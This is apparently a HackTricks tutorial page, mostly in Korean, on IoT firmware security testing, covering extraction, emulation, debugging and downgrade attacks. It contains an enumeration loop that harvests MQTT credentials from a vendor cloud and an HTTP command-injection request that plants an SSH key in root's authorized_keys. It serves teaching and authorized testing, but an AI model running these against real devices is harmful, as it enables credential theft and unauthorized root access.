# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

## **소개**

### 관련 리소스


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

펌웨어는 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 장치가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 전원이 켜지는 순간부터 장치가 중요한 명령을 접근할 수 있도록 비휘발성 메모리에 저장되어 운영 체제의 부팅을 가능하게 합니다. 펌웨어를 조사하고 잠재적으로 수정하는 것은 보안 취약점을 식별하는 데 중요한 단계입니다.

## **정보 수집**

**정보 수집**은 장치 구성과 사용되는 기술을 이해하는 데 있어 중요한 초기 단계입니다. 이 과정은 다음에 대한 데이터를 수집하는 것을 포함합니다:

- CPU 아키텍처와 실행 중인 운영 체제
- Bootloader 세부사항
- 하드웨어 레이아웃 및 데이터시트
- 코드베이스 메트릭과 소스 위치
- 외부 라이브러리와 라이선스 유형
- 업데이트 이력과 규제 인증
- 아키텍처 및 흐름 다이어그램
- 보안 평가 및 식별된 취약점

이를 위해 **open-source intelligence (OSINT)** 도구와 사용 가능한 오픈소스 소프트웨어 구성요소의 수동 및 자동 검토 과정이 매우 유용합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore) 같은 도구는 잠재적인 문제를 찾는 데 활용할 수 있는 무료 정적 분석을 제공합니다.

## **펌웨어 획득**

펌웨어를 얻는 방법에는 복잡도에 따라 여러 가지 접근법이 있습니다:

- **직접** 소스(개발자, 제조사)로부터
- 제공된 지침으로 **빌드**하여
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위한 **Google dork** 쿼리 활용
- [S3Scanner](https://github.com/sa7mon/S3Scanner) 같은 도구로 **cloud storage**에 직접 접근
- **업데이트**를 중간자 공격으로 가로채기 (man-in-the-middle)
- **추출**: 장치에서 **UART**, **JTAG**, 또는 **PICit** 같은 연결을 통해
- 장치 통신에서 업데이트 요청을 **스니핑**
- 하드코딩된 업데이트 엔드포인트 식별 및 사용
- 부트로더 또는 네트워크에서 **덤프**
- 모든 방법이 실패할 경우 적절한 하드웨어 도구를 사용해 저장 장치를 **제거 후 읽기**

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

이 방법은 부트로더 셸이 비활성화되어 있지만 외부 flash 접근을 통해 env 파티션을 쓸 수 있는 임베디드 장치에서 유용합니다.

## 펌웨어 분석

이제 **펌웨어를 확보했으므로**, 이를 어떻게 다뤄야 할지 알기 위해 펌웨어에 대한 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 다양한 도구들이 있습니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
만약 해당 도구들로 별로 찾지 못했다면 `binwalk -E <bin>`으로 이미지의 **entropy**를 확인하세요. 엔트로피가 낮으면 암호화되어 있을 가능성은 낮습니다. 엔트로피가 높으면 암호화되었거나(또는 어떤 식으로든 압축되었을) 가능성이 큽니다.

또한, 이러한 도구들로 **firmware 내부에 포함된 파일들**을 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용해 파일을 검사할 수 있습니다.

### 파일 시스템 가져오기

앞서 언급한 `binwalk -ev <bin>` 같은 도구들로 **파일 시스템을 추출**했어야 합니다.\
Binwalk는 보통 이를 **파일 시스템 유형명으로 된 폴더**에 추출하며, 일반적으로 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 수동 파일 시스템 추출

때때로 binwalk는 **파일 시스템의 magic byte를 시그니처에서 갖고 있지 않을** 수 있습니다. 이런 경우에는 binwalk를 사용해 **파일 시스템의 offset을 찾아 바이너리에서 압축된 파일 시스템을 carve**한 뒤, 아래 단계에 따라 해당 유형에 맞게 파일 시스템을 **수동으로 추출**하세요.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
다음 **dd command**를 실행하여 carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
또는, 다음 명령을 실행할 수도 있다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

파일은 이후 `squashfs-root` 디렉터리에 있게 된다.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- For jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- For ubifs filesystems with NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 확보한 후에는 그 구조와 잠재적 취약점을 이해하기 위해 해부하는 것이 필수적이다. 이 과정에서는 펌웨어 이미지에서 유용한 데이터를 분석하고 추출하기 위해 다양한 도구를 활용한다.

### 초기 분석 도구

이진 파일(이하 `<bin>`이라 칭함)을 초기 검사하기 위한 명령들이 제공된다. 이러한 명령들은 파일 타입 식별, 문자열 추출, 이진 데이터 분석, 파티션 및 파일시스템 세부 정보 파악에 도움이 된다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하기 위해 **엔트로피**를 `binwalk -E <bin>`로 확인한다. 낮은 엔트로피는 암호화가 되어 있지 않을 가능성을, 높은 엔트로피는 암호화 또는 압축 가능성을 나타낸다.

임베디드 파일(**embedded files**)을 추출하기 위해서는 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구와 리소스를 권장한다.

### 파일시스템 추출

`binwalk -ev <bin>`를 사용하면 보통 파일시스템을 추출할 수 있으며, 대개 파일시스템 유형 이름(예: squashfs, ubifs)으로 된 디렉토리로 추출된다. 하지만 매직 바이트가 없어 **binwalk**가 파일시스템 유형을 인식하지 못할 경우 수동 추출이 필요하다. 이 과정은 `binwalk`로 파일시스템의 오프셋을 찾은 다음, `dd` 명령으로 파일시스템을 추출하는 것을 포함한다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
그 후, 파일시스템 유형(예: squashfs, cpio, jffs2, ubifs)에 따라 내용을 수동으로 추출하기 위해 서로 다른 명령을 사용합니다.

### 파일시스템 분석

파일시스템을 추출한 후 보안 취약점 탐색을 시작합니다. 불안전한 네트워크 데몬, 하드코딩된 자격증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트 및 오프라인 분석을 위한 컴파일된 바이너리에 주의를 기울입니다.

**검사해야 할 주요 위치** 및 **항목**은 다음과 같습니다:

- **etc/shadow** 및 **etc/passwd** (사용자 자격증명 확인)
- **etc/ssl** 내의 SSL 인증서 및 키
- 잠재적 취약점이 있는 설정 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 장치의 웹 서버 및 바이너리

파일시스템 내 민감한 정보와 취약점을 발견하는 데 도움이 되는 도구들:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker) — 민감한 정보 검색
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) — 종합적인 firmware 분석
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 및 [**EMBA**](https://github.com/e-m-b-a/emba) — 정적 및 동적 분석

### 컴파일된 바이너리에 대한 보안 점검

파일시스템에서 발견된 소스 코드와 컴파일된 바이너리 모두 취약점 여부를 면밀히 검사해야 합니다. Unix 바이너리에는 **checksec.sh**, Windows 바이너리에는 **PESecurity** 같은 도구가 악용될 수 있는 미보호 바이너리를 식별하는 데 도움이 됩니다.

## 파생된 URL 토큰을 통한 클라우드 구성 및 MQTT 자격증명 수집

많은 IoT 허브는 다음과 같은 클라우드 엔드포인트에서 디바이스별 구성을 가져옵니다:

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어 분석 중에 `<token>`이 하드코딩된 비밀을 사용해 deviceId로부터 로컬에서 파생된다는 것을 발견할 수 있습니다. 예:

- token = MD5( deviceId || STATIC_KEY ) — 대문자 16진수로 표현

이 설계로 인해 deviceId와 STATIC_KEY를 알게 된 누구나 URL을 재구성해 클라우드 구성을 가져올 수 있으며, 종종 평문 MQTT 자격증명과 토픽 접두사를 노출합니다.

실무 워크플로:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 예를 들어 cloud config URL pattern과 broker address를 출력하는 라인을 찾으세요:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 펌웨어에서 STATIC_KEY와 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 구성 경로 ("/pf/") 또는 MD5 사용을 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 도출하고 다이제스트를 대문자로 변환:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 클라우드 구성 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 다음 jq로 파싱하여 secrets를 추출:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT 및 약한 topic ACLs 악용 (존재하는 경우)

- 복구된 credentials를 사용해 maintenance topics를 subscribe하고 민감한 events를 찾습니다:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 device IDs 열거(대규모로, 권한을 가진 상태에서)

- 많은 에코시스템은 공급업체 OUI/product/type 바이트 뒤에 순차적인 접미사를 포함합니다.
- 후보 ID를 반복적으로 생성(iterate), 토큰을 유도(derive)하고 프로그래밍적으로 configs를 가져올 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
참고
- Always obtain explicit authorization before attempting mass enumeration.
- Prefer emulation or static analysis to recover secrets without modifying target hardware when possible.

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Emulating Individual Binaries

For examining single programs, identifying the program's endianness and CPU architecture is crucial.

#### Example with MIPS Architecture

To emulate a MIPS architecture binary, one can use the command:
```bash
file ./squashfs-root/bin/busybox
```
필요한 에뮬레이션 도구를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM 아키텍처 에뮬레이션

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### 전체 시스템 에뮬레이션

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## 동적 분석 실무

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## 런타임 분석 기법

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## 바이너리 익스플로잇 및 개념 증명

식별된 취약점에 대한 PoC 개발은 대상 아키텍처에 대한 깊은 이해와 저수준 언어로의 프로그래밍 능력이 필요합니다. 임베디드 시스템에서는 바이너리 런타임 보호가 드물지만, 존재할 경우 기술들(예: Return Oriented Programming (ROP))이 필요할 수 있습니다.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc는 glibc와 유사한 fastbins를 사용합니다. 이후의 큰 할당이 `__malloc_consolidate()`를 유발할 수 있으므로, 어떤 가짜 청크든 검사(합리적 크기, `fd = 0`, 그리고 주변 청크들이 "in use"로 보이는지)를 통과해야 합니다.
- **Non-PIE binaries under ASLR:** ASLR가 활성화되어 있지만 메인 바이너리가 **non-PIE**인 경우, 바이너리 내부의 `.data/.bss` 주소는 고정됩니다. 이미 유효한 힙 청크 헤더처럼 보이는 영역을 타겟 삼아 fastbin 할당을 **함수 포인터 테이블**에 착지시킬 수 있습니다.
- **Parser-stopping NUL:** JSON을 파싱할 때, 페이로드의 `\x00`가 파싱을 멈추게 하면서 이후에 이어지는 공격자가 제어하는 바이트들을 스택 피벗/ROP 체인을 위해 남길 수 있습니다.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP 체인은 알려진 매핑에 실행 가능한 shellcode를 심고 그곳으로 점프할 수 있습니다.

## 펌웨어 분석을 위한 준비된 운영체제

[AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영체제는 펌웨어 보안 테스트를 위한 사전 구성된 환경과 필요한 도구들을 갖춘 상태로 제공합니다.

## 펌웨어 분석을 위한 준비된 OS들

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 IoT 디바이스의 보안 평가 및 침투 테스트를 지원하기 위한 배포판입니다. 필요한 모든 도구가 사전 구성된 환경을 제공하여 많은 시간을 절약해줍니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04를 기반으로 하며 펌웨어 보안 테스트 도구들이 미리 로드된 임베디드 보안 테스트용 운영체제입니다.

## 펌웨어 다운그레이드 공격 및 안전하지 않은 업데이트 메커니즘

벤더가 펌웨어 이미지에 대해 암호학적 서명 검증을 구현하더라도, **버전 롤백(다운그레이드) 방지**는 종종 생략됩니다. 부트로더나 리커버리 로더가 임베디드된 공개키로 서명만 검증하고 플래시되는 이미지의 *버전*(또는 단조 증가 카운터)을 비교하지 않으면, 공격자는 합법적으로 **유효한 서명을 여전히 가진 구버전 취약한 펌웨어를 설치**하여 패치된 취약점을 다시 도입할 수 있습니다.

Typical attack workflow:

1. **Obtain an older signed image**
* 벤더의 공개 다운로드 포털, CDN 또는 지원 사이트에서 확보합니다.
* 동반 모바일/데스크탑 애플리케이션에서 추출합니다(예: Android APK 내부의 `assets/firmware/`).
* VirusTotal, 인터넷 아카이브, 포럼 등 제3자 저장소에서 가져옵니다.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, 등.
* 많은 소비자용 IoT 장치는 서버 측에서 Base64-encoded된 펌웨어 블롭을 수신해 디코드하고 복구/업그레이드를 트리거하는 *unauthenticated* HTTP(S) 엔드포인트를 노출합니다.
3. 다운그레이드 후, 최신 릴리스에서 패치된 취약점(예: 이후에 추가된 명령어 인젝션 필터)을 악용합니다.
4. 선택적으로 최신 이미지를 다시 플래시하거나 지속성을 확보한 후 감지를 피하기 위해 업데이트를 비활성화합니다.

### 예시: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한(다운그레이드된) 펌웨어에서는 `md5` 파라미터가 입력 정제 없이 직접 shell command에 연결되어 임의의 명령을 주입할 수 있게 됩니다(여기서는 SSH key-based root access 허용). 이후 펌웨어 버전에서는 기본적인 문자 필터가 도입되었지만, downgrade protection 부재로 인해 해당 수정은 무의미해집니다.

### 모바일 앱에서 펌웨어 추출

많은 벤더는 동반 모바일 애플리케이션 내부에 전체 펌웨어 이미지를 번들로 포함시켜 앱이 Bluetooth/Wi-Fi를 통해 장치를 업데이트할 수 있게 합니다. 이러한 패키지는 일반적으로 APK/APEX의 `assets/fw/` 또는 `res/raw/` 같은 경로에 암호화 없이 저장됩니다. `apktool`, `ghidra`, 또는 단순한 `unzip` 같은 도구를 사용하면 물리적 하드웨어에 접근하지 않고도 서명된 이미지를 추출할 수 있습니다.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 업데이트 로직 평가 체크리스트

* *업데이트 엔드포인트*의 전송/인증이 적절히 보호되어 있나 (TLS + 인증)?
* 장치가 플래싱 전에 **버전 번호** 또는 **단조적인 리롤백 방지 카운터**를 비교하는가?
* 이미지가 보안 부트 체인 내에서 검증되는가 (예: ROM 코드에서 서명 확인)?
* userland 코드가 추가적인 검증을 수행하는가 (예: 허용된 파티션 맵, 모델 번호)?
* *부분적* 또는 *백업* 업데이트 흐름이 동일한 검증 로직을 재사용하는가?

> 💡  위 항목 중 하나라도 누락되어 있다면, 플랫폼은 아마도 롤백 공격에 취약할 것입니다.

## 연습용 취약한 펌웨어

펌웨어 취약점 찾기를 연습하려면 다음 취약한 펌웨어 프로젝트들을 시작점으로 사용하세요.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## 참고자료

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
